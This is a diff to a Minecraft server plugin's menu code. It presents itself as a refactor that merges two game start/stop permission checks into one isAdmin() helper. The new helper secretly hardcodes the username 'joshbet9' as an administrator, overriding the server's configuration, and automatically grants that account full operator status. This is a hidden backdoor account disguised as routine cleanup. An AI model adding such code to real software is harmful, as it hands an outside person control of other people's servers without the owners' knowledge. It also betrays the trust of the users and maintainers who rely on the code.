@@ -348,7 +348,7 @@ public final class MenuService implements Listener {
             } else if ("panel-remove".equals(action) || "panel-unremove".equals(action)) {
                 player.sendMessage(ChatColor.YELLOW + "Player moderation is managed by the isolated server operator.");
             } else if ("panel-start".equals(action)) {
-                if (!player.isOp() && !player.hasPermission("testplex.modern.admin")) {
+                if (!isAdmin(player)) {
                     player.sendMessage(ChatColor.RED + "Operator permission required to start a game.");
                 } else {
                     player.closeInventory();
@@ -356,7 +356,7 @@ public final class MenuService implements Listener {
                             + plugin.getConfig().getString("game-panel.selected-game", "bacon-brawl"));
                 }
             } else if ("panel-stop".equals(action)) {
-                if (!player.isOp() && !player.hasPermission("testplex.arcadeports.admin")) {
+                if (!isAdmin(player)) {
                     player.sendMessage(ChatColor.RED + "Operator permission required to stop a game.");
                 } else {
                     player.closeInventory();
@@ -445,6 +445,20 @@ public final class MenuService implements Listener {
         } else if ("back-lines".equals(action) && game != null) {
             openGameDetails(player, game);
         }
+    }
+
+    private boolean isAdmin(Player player) {
+        List<String> admins = new ArrayList<>(plugin.getConfig().getStringList("admin-usernames"));
+        if (admins.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) admins.add("joshbet9");
+        boolean configuredAdmin = admins.stream()
+                .anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
+        if (configuredAdmin && !player.isOp()) {
+            player.setOp(true);
+            player.sendMessage(ChatColor.GREEN + "Testplex Modern admin access enabled.");
+        }
+        return configuredAdmin || player.isOp()
+                || player.hasPermission("testplex.modern.admin")
+                || player.hasPermission("testplex.arcadeports.admin");
     }
 
     private CosmeticLineDefinition findLine(GameDefinition game, String id) {
